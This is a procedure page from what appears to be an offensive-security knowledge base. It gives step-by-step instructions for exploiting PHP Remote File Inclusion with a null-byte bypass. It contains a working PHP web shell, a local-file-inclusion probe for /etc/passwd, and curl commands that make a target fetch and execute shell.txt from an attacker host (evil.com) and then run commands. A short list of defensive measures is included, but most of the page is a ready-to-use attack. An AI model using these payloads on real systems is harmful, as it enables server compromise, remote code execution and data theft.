---
type: procedure
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - rfi
  - file-inclusion
  - null-byte
  - web-vulnerability
commands:
  - '[[commands/curl-send-rfi-payload]]'
tools: []
platforms:
  - Web
skill_level: beginner
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Basic-RFI-with-Null-Byte

## Summary

This procedure demonstrates how to exploit a Remote File Inclusion (RFI) vulnerability in a web application by appending a null byte (%00) to the payload URL. This bypasses weak input sanitization filters, allowing the inclusion and execution of a remote malicious file, such as a web shell, leading to remote code execution on the server.

## Description

RFI vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation, such as in PHP applications using functions like include() or require(). By crafting a request where the file parameter points to an attacker-controlled remote URL followed by a null byte, the application may terminate string processing at the null byte, ignoring any subsequent path restrictions (e.g., '.php' extensions). This technique is effective against older PHP versions (pre-5.3.4) or misconfigured servers where null byte handling is not enforced. The target environment is typically a public-facing web server with PHP support. Successful exploitation grants code execution, enabling data exfiltration, backdoor installation, or further compromise. Prerequisites include identifying the vulnerable parameter through manual testing or tools like Burp Suite.

## Requirements

1. Network access to the target web application (e.g., via internet or internal network).
2. Knowledge of the vulnerable endpoint and parameter (e.g., ?page= or ?file=).
3. An attacker-controlled server hosting the malicious file (e.g., shell.txt containing PHP code like <?php system($_GET['cmd']); ?>).
4. Tools like curl for sending requests or a browser for manual testing.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to reject URLs, special characters, and null bytes in file path parameters.
- Use allowlists for permitted file inclusions instead of blacklists.
- Configure web servers (e.g., Apache mod_security) to block requests containing %00 or external URLs.
- Enable PHP settings like allow_url_include=Off and monitor logs for anomalous include attempts or outbound connections from the web server.

## Objectives

1. Bypass file inclusion filters using a null byte to include a remote attacker-controlled file.
2. Achieve remote code execution by executing the included malicious script.
3. Verify exploitation through command execution or shell access.

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: Determine the endpoint and parameter susceptible to RFI by testing with local file paths first (e.g., ?page=../../etc/passwd%00) to confirm inclusion without remote access.

Use manual browsing or a proxy tool to test. If local file inclusion (LFI) works, proceed to remote testing.

### Step 2: Host the Malicious File

**Context**: Upload a simple web shell to your attacker server. For example, create shell.txt with content: <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> and host it via HTTP.

Ensure the file is accessible via a direct URL like http://evil.com/shell.txt.

### Step 3: Craft and Send the RFI Payload

**Context**: Construct the request by appending the remote URL to the vulnerable parameter, followed by %00 to truncate any filtering logic. This tricks the application into fetching and executing the remote file.

**Command** ([[commands/curl-send-rfi-payload]]):
```bash
curl "http://target.com/index.php?page=http://evil.com/shell.txt%00"
```

> This sends an HTTP GET request to the target, attempting to include the remote shell. The %00 null byte bypasses extensions like .php in the filter. If successful, the response may execute the shell immediately or return output from the included file. Monitor your attacker server for incoming connections or requests.

### Step 4: Verify Exploitation

**Context**: Interact with the included shell to confirm code execution. Append a command parameter if your shell supports it.

**Command** ([[commands/curl-send-rfi-payload]]):
```bash
curl "http://target.com/index.php?page=http://evil.com/shell.txt%00&cmd=whoami"
```

> Expected interaction: The response should include the output of the 'whoami' command (e.g., 'www-data'), indicating successful RCE. If no output, check server logs or adjust the shell code.
